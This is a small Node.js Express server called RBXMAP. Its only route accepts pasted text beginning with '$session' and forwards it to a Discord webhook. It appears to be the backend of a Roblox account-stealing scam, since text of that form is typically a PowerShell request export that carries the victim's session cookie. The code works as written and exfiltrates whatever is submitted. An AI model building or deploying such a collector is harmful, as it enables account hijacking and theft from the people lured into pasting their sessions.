require('dotenv').config();

const express = require('express');
const rateLimit = require('express-rate-limit');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

if (!WEBHOOK_URL) {
  console.error('DISCORD_WEBHOOK_URL manquant dans le fichier .env');
  process.exit(1);
}

app.use(express.json({ limit: '1mb' }));

const submitLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { error: 'too_many_requests' },
  standardHeaders: true,
  legacyHeaders: false
});

app.use(express.static(path.join(__dirname)));

function buildEmbed(text) {
  const maxChunk = 4088;
  const content = text.slice(0, maxChunk);

  return {
    title: '📥 Nouveau fichier reçu sur RBXMAP',
    description: '```\n' + content + '\n```',
    color: 0x22c55e,
    timestamp: new Date().toISOString(),
    footer: { text: 'RBXMAP' }
  };
}

app.post('/api/submit', submitLimiter, async (req, res) => {
  const text = typeof req.body?.text === 'string' ? req.body.text.trim() : '';

  if (!text || !text.startsWith('$session')) {
    return res.status(400).json({ error: 'invalid' });
  }

  try {
    const discordRes = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'RBXMAP',
        embeds: [buildEmbed(text)]
      })
    });

    if (!discordRes.ok) {
      const errBody = await discordRes.text();
      throw new Error(`Discord responded with ${discordRes.status}: ${errBody}`);
    }

    res.json({ success: true });
  } catch (err) {
    console.error('Erreur envoi Discord:', err.message);
    res.status(500).json({ error: 'send_failed' });
  }
});

app.listen(PORT, () => {
  console.log(`RBXMAP running on http://localhost:${PORT}`);
});
